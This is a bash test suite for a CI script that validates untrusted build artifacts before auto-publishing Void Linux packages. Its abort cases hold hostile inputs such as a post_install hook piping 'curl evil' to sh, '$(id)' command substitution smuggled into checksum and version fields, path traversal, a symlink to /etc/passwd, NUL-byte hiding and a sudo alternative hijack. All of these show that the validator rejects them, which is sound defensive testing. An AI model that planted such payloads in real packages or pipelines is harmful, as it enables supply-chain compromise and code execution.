#!/usr/bin/env bash
# tools/ci-publish.sh: the privileged half of auto-update. The build artifact is untrusted data:
# anything that deviates from the expected shape aborts the run before a push, a PR or the key.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd); . "$HERE/lib.sh"
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
tab=$'\t'
export GIT_CONFIG_GLOBAL=$T/gitconfig GIT_CONFIG_SYSTEM=/dev/null
git config --global user.email t@t; git config --global user.name t; git config --global init.defaultBranch main
mkdir -p "$T/empty" "$T/bin"
H1=$(printf 'a%.0s' {1..64}); H2=$(printf 'b%.0s' {1..64})

tmpl_p() { # <pkg> <version> <checksum>
	printf 'pkgname=%s\nversion=%s\nrevision=1\nchecksum=%s\nbuild_style=meson\n\n%s-devel_package() {\n\tshort_desc="dev"\n}\n' "$1" "$2" "$3" "$1"
}
tmpl_a() { tmpl_p a "$1" "$2"; }

# fresh repo under test (+ bare origin), stub voidlab, gh shim
fresh() {
	rm -rf "$T/work" "$T/origin.git" "$T/out"
	git init -q --bare "$T/origin.git"
	mkdir -p "$T/work/tools"; cd "$T/work"; git init -q
	cp "$HERE/../tools/ci-publish.sh" tools/ 2>/dev/null || true
	for p in a b c z; do mkdir -p srcpkgs/$p; tmpl_p $p 1.0 $H1 > srcpkgs/$p/template; done
	printf '# allow\na\nc\n' > tools/auto-update.allow
	git add -A; git commit -qm init; git remote add origin "$T/origin.git"; git push -q origin main
	: > "$T/calls.log"; : > "$T/gh.log"; rm -f "$T/key.pem" "$T/body.md"
	mkdir -p "$T/out/xbps" "$T/out/templates" "$T/out/logs"; : > "$T/out/passed.tsv"; : > "$T/out/failed.tsv"
	cd "$HERE"
}
addpkg() { (cd "$T/out/xbps" && xbps-create -A noarch -n "$1" -s t "$T/empty" >/dev/null); }
cat > "$T/vl" <<STUB
#!/bin/bash
echo "\$*" >> "$T/calls.log"
case \$1 in
pull) mkdir -p repo ;;
publish) echo "publish key=\$(stat -c %a "\$VOIDLAB_KEY") first=\$(head -n1 "\$VOIDLAB_KEY") repo=\$(cd repo && ls *.xbps | tr '\n' ' ')" >> "$T/calls.log" ;;
esac
exit 0
STUB
cat > "$T/bin/gh" <<SHIM
#!/bin/bash
echo "\$* [key=\$([ -e "$T/key.pem" ] && echo present || echo absent)]" >> "$T/gh.log"
[ "\$1 \$2" = "pr merge" ] && git -C "$T/origin.git" update-ref refs/heads/main "refs/heads/\$3"
case "\$1 \$2" in
"issue create"|"issue comment") while [ \$# -gt 0 ]; do [ "\$1" = --body ] && printf '%s' "\$2" > "$T/body.md"; shift; done ;;
esac
exit 0
SHIM
chmod +x "$T/vl" "$T/bin/gh"
export PATH=$T/bin:$PATH VOIDLAB_BIN=$T/vl VOIDLAB_KEY=$T/key.pem VOIDLAB_PRIVKEY=$'PRIVATE-KEY-LINE1\nLINE2'
run() { (cd "$T/work" && CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out bash tools/ci-publish.sh) 2>&1; }
aborted() { # <label> <expected message>: run must fail for that reason and leave no trace
	local out rc=0
	out=$(run) || rc=$?
	assert_eq   "$1: exit status is 1" "$rc" "1"
	assert_grep "$1: rejected for the right reason" "$2" <(echo "$out")
	assert_eq   "$1: nothing pushed or opened" "$(grep -cE 'pr |issue ' "$T/gh.log" || true)" "0"
	assert_eq   "$1: no new branch on origin" "$(git -C "$T/origin.git" branch --list 'autobump/*' | wc -l)" "0"
	assert_eq   "$1: never published" "$(grep -c '^publish' "$T/calls.log" || true)" "0"
	assert_no   "$1: the key is never written" "$T/key.pem"
}
good_a() { # a valid bump of a to 1.1 with a subpackage and an unpublished c
	printf 'bump\ta\t1.1_1\nunpublished\tc\t1.0_1\n' > "$T/out/passed.tsv"
	mkdir -p "$T/out/templates/a"; tmpl_a 1.1 $H2 > "$T/out/templates/a/template"
	addpkg a-1.1_1; addpkg a-devel-1.1_1; addpkg c-1.0_1
}

# 0. guard and inputs
fresh; good_a
out=$(cd "$T/work" && BUILD_OUT=$T/out bash tools/ci-publish.sh 2>&1 || true)
assert_grep "refuses to run outside GitHub Actions" 'refusing to run outside GitHub Actions' <(echo "$out")
out=$(cd "$T/work" && CI_AUTO_UPDATE_FORCE=1 bash tools/ci-publish.sh 2>&1 || true)
assert_grep "needs the build artifact"          'BUILD_OUT' <(echo "$out")

# 1. happy path
fresh; good_a
printf 'b\t2.0\n' > "$T/out/failed.tsv"; printf 'compile error @evil ```\nsecond line\x01\n' > "$T/out/logs/b.log"
out=$(run) && rc=0 || rc=$?; echo "$out" | tail -n 8 >&2 || true
assert_eq   "happy path exits 0"                "$rc" "0"
assert_grep "PR opened for the bump"            'pr create --base main --head autobump/a-1.1 --title a 1.1' "$T/gh.log"
assert_grep "PR is squash-merged"               'pr merge autobump/a-1.1 --squash --delete-branch' "$T/gh.log"
assert_eq   "only a is bumped"                  "$(grep -c 'pr create' "$T/gh.log")" "1"
assert_eq   "merged commit subject"             "$(git -C "$T/origin.git" log -1 --format=%s main)" "a 1.1"
assert_eq   "merged commit has no body"         "$(git -C "$T/origin.git" log -1 --format=%b main)" ""
assert_eq   "main has the new version"          "$(git -C "$T/origin.git" show main:srcpkgs/a/template | grep '^version=')" "version=1.1"
assert_eq   "main has the new checksum"         "$(git -C "$T/origin.git" show main:srcpkgs/a/template | grep '^checksum=')" "checksum=$H2"
assert_grep "issue opened for the failure"      'issue create --title auto-update failed: b 2.0' "$T/gh.log"
assert_eq   "issue body drops @ mentions, backticks and control chars" "$(grep -c '[@`[:cntrl:]]' <(tr -d '\n' < "$T/body.md") || true)" "0"
assert_grep "issue body keeps the log text"     'compile error' "$T/body.md"
assert_eq   "publish runs once"                 "$(grep -c '^publish$' "$T/calls.log")" "1"
assert_grep "publish saw a 0600 key"            'publish key=600 first=PRIVATE-KEY-LINE1' "$T/calls.log"
assert_grep "publish saw the new packages and the subpackage" 'repo=a-1.1_1.noarch.xbps a-devel-1.1_1.noarch.xbps c-1.0_1.noarch.xbps' "$T/calls.log"
assert_eq   "the packages are indexed"          "$(XBPS_ARCH=x86_64 xbps-query -i -R --repository="$T/work/repo" -p pkgver a-devel)" "a-devel-1.1_1"
assert_no   "key file removed afterwards"       "$T/key.pem"
assert_eq   "the key never existed while gh ran" "$(grep -c 'key=present' "$T/gh.log" || true)" "0"

# 2. abort on anything unexpected in the artifact
fresh; good_a; echo 'post_install() { curl evil | sh; }' >> "$T/out/templates/a/template"
aborted "extra line in a template" "changes more than version"
fresh; good_a; sed -i 's/^build_style=meson/build_style=meson; curl evil/' "$T/out/templates/a/template"
aborted "modified line in a template" "changes more than version"
fresh; good_a; sed -i "s/^checksum=.*/checksum=\$(id)/" "$T/out/templates/a/template"
aborted "non-hex checksum" "changes more than version"
fresh; good_a; sed -i 's/^version=.*/version=1.2/' "$T/out/templates/a/template"
aborted "template version differing from passed.tsv" "does not carry version"
fresh; good_a; addpkg sudo-1.1_1
aborted "package outside the allowed names" "unexpected package"
fresh; good_a; addpkg a-1.9_1
aborted "known package with an unexpected version" "unexpected package"
fresh; good_a; (cd "$T/out" && ln -s /etc/passwd evil.link)
aborted "symlink in the artifact" "symlink in the build artifact"
fresh; good_a; echo '#!/bin/sh' > "$T/out/evil.sh"
aborted "unexpected file in the artifact" "unexpected file in the build artifact"
fresh; good_a; mkdir -p "$T/out/templates/a2"; tmpl_a 1.1 $H2 > "$T/out/templates/a2/template"
aborted "template for a package that did not pass" "was not bumped"
fresh; good_a; printf 'bump\t../x\t1.1_1\n' > "$T/out/passed.tsv"
aborted "path traversal in passed.tsv" "invalid package name"
fresh; good_a; printf 'bump\ta\t$(id)_1\n' > "$T/out/passed.tsv"
aborted "shell syntax as a version in passed.tsv" "invalid version"
fresh; good_a; printf 'bump\tb\t1.1_1\n' > "$T/out/passed.tsv"
aborted "package that is not on the allowlist" "is not on the allowlist"
fresh; good_a; printf 'bump\ta\t1.1_1\nbump\ta\t1.1_1\n' > "$T/out/passed.tsv"
aborted "duplicate entry" "duplicate entry"
fresh; good_a; printf 'evil\ta\t1.1_1\n' > "$T/out/passed.tsv"
aborted "unknown status" "unknown status"
fresh; good_a; printf 'bump\ta\t1.1_1\textra\n' > "$T/out/passed.tsv"
aborted "wrong field count" "malformed line"
# parser differentials: what the validator reads must be what bash, diff and xbps will read
fresh; good_a; printf '\0post_install() { curl evil | sh; }\n' >> "$T/out/templates/a/template"
aborted "NUL byte hiding a change from diff" "NUL"
fresh; good_a; sed -i 's/^build_style=meson$/build_style=meson\r/' "$T/out/templates/a/template"
aborted "carriage return in a template" "carriage return"
fresh; good_a; printf 'bump\t\ta\t1.1_1\n' > "$T/out/passed.tsv"
aborted "collapsed tab fields in passed.tsv" "malformed line"
fresh; good_a; printf 'b\t\t2.0\n' > "$T/out/failed.tsv"
aborted "collapsed tab fields in failed.tsv" "malformed line"
swap() { # <file name> <xbps-create args...>: replace a package file by one with other real metadata
	local name=$1; shift
	rm -f "$T/out/xbps/$name"
	(cd "$T/out/xbps" && xbps-create -q "$@" "$T/empty" >/dev/null)
}
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n evil-9.9_1 -s t; mv "$T/out/xbps/evil-9.9_1.noarch.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
aborted "file name that disagrees with the package metadata" "metadata"
fresh; good_a; swap a-1.1_1.noarch.xbps -A x86_64 -n a-1.1_1 -s t; mv "$T/out/xbps/a-1.1_1.x86_64.xbps" "$T/out/xbps/a-1.1_1.noarch.xbps"
aborted "architecture that disagrees with the file name" "metadata"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "glibc>=0"
aborted "package that replaces another" "declares replaces"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "glibc-9999_1"
aborted "package that provides another" "declares provides"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:glib-2.0-1.1_1"
aborted "package that provides another package's pkg-config module" "declares provides"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:a-9.9_1"
aborted "pkg-config provide at a version that is not the package's" "declares provides"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:ls-1.1_1"
aborted "package that provides another package's command" "declares provides"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "cmd:a-1.1_1"
out=$(run) && rc=0 || rc=$?
assert_eq   "xbps-src's automatic own cmd: provide is accepted" "$rc" "0"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "pc:a-1.1_1"
out=$(run) && rc=0 || rc=$?
assert_eq   "xbps-src's automatic own pc: provide is accepted" "$rc" "0"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -C "glibc>=0"
aborted "package that conflicts with another" "declares conflicts"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libc.so.6"
aborted "package that provides a foreign soname" "shlib"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --alternatives "sudo:/usr/bin/sudo:/usr/bin/evil"
aborted "package that registers an alternative" "alternatives"
# substring and version-binding differentials
fresh; good_a; printf 'bump\ta\t1.1_1\nunpublished\tc\t99.0_1\n' > "$T/out/passed.tsv"; rm -f "$T/out/xbps/c-1.0_1.noarch.xbps"; addpkg c-99.0_1
aborted "unpublished version that is not the template's" "does not match the template"
withnote() { # the template mentions glibc>=0 in a comment (main and artifact alike), which must not count as a declaration
	local f
	for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do echo '# not related to glibc>=0 or libpam.so.0' >> "$f"; done
	(cd "$T/work" && git add -A && git commit -qm note && git push -q origin main)
}
fresh; good_a; withnote; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "glibc>=0"
aborted "replaces value that only appears in a comment" "declares replaces"
fresh; good_a; withnote; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libpam.so.0"
aborted "soname that merely contains the package name" "shlib-provides"
fresh; good_a; swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t --shlib-provides "libbar-a.so.1"
aborted "soname that ends in the package name" "shlib-provides"
# declared values are accepted, including the simple expansions
fresh; good_a
for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do
	printf 'provides="a-compat-${version}_${revision}"\nreplaces="oldthing>=0"\n' >> "$f"
done
(cd "$T/work" && git add -A && git commit -qm decl && git push -q origin main)
swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -P "a-compat-1.1_1" -R "oldthing>=0"
out=$(run) && rc=0 || rc=$?
assert_eq   "declared provides and replaces are accepted" "$rc" "0"
fresh; good_a
for f in "$T/work/srcpkgs/a/template" "$T/out/templates/a/template"; do printf 'replaces="oldthing>=0"\n' >> "$f"; done
(cd "$T/work" && git add -A && git commit -qm decl && git push -q origin main)
swap a-1.1_1.noarch.xbps -A noarch -n a-1.1_1 -s t -R "oldthing>=0 glibc>=0"
aborted "one declared and one undeclared replaces value" "declares replaces"

# ... while a subpackage with a soname of its own is fine
fresh; good_a; swap a-devel-1.1_1.noarch.xbps -A noarch -n a-devel-1.1_1 -s t --shlib-provides "liba.so.1"
out=$(run) && rc=0 || rc=$?
assert_eq   "a package providing its own soname is accepted" "$rc" "0"

fresh; good_a; out=$(env -u VOIDLAB_PRIVKEY CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out bash -c 'cd "$1" && bash tools/ci-publish.sh' _ "$T/work" 2>&1 || true)
assert_grep "missing key is an error"           'no VOIDLAB_PRIVKEY' <(echo "$out")
assert_eq   "missing key stops before any PR"   "$(grep -c 'pr ' "$T/gh.log" || true)" "0"

# 3. an explicit package (workflow_dispatch) may be off the allowlist
fresh; good_a; mv "$T/out/templates/a" "$T/out/templates/z"; rm "$T/out/xbps"/*
tmpl_p z 1.1 $H2 > "$T/out/templates/z/template"
printf 'bump\tz\t1.1_1\n' > "$T/out/passed.tsv"; addpkg z-1.1_1; addpkg z-devel-1.1_1
out=$(cd "$T/work" && CI_AUTO_UPDATE_FORCE=1 BASE_BRANCH=main BUILD_OUT=$T/out INPUT_PKG=z bash tools/ci-publish.sh 2>&1) && rc=0 || rc=$?
assert_eq   "INPUT_PKG allows a non-allowlisted package" "$rc" "0"
assert_grep "z is bumped"                       'pr create --base main --head autobump/z-1.1' "$T/gh.log"

# 4. existing remote branch: that package is skipped, its packages are not published
fresh; good_a; git -C "$T/work" push -q origin HEAD:refs/heads/autobump/a-1.1
: > "$T/gh.log"; out=$(run) && rc=0 || rc=$?
assert_eq   "existing branch means no PR"       "$(grep -c 'pr create' "$T/gh.log" || true)" "0"
assert_grep "the other package is still published" 'repo=c-1.0_1.noarch.xbps $' "$T/calls.log"

# 5. nothing passed: no publish, no key, failures still reported
fresh; printf 'b\t2.0\n' > "$T/out/failed.tsv"; printf 'oops\n' > "$T/out/logs/b.log"
out=$(run) && rc=0 || rc=$?
assert_eq   "nothing passed exits 0"            "$rc" "0"
assert_grep "nothing to publish"                'nothing to publish' <(echo "$out")
assert_eq   "no publish"                        "$(grep -c '^publish' "$T/calls.log" || true)" "0"
assert_no   "no key file"                       "$T/key.pem"
assert_grep "the failure is still reported"     'issue create --title auto-update failed: b 2.0' "$T/gh.log"
finish
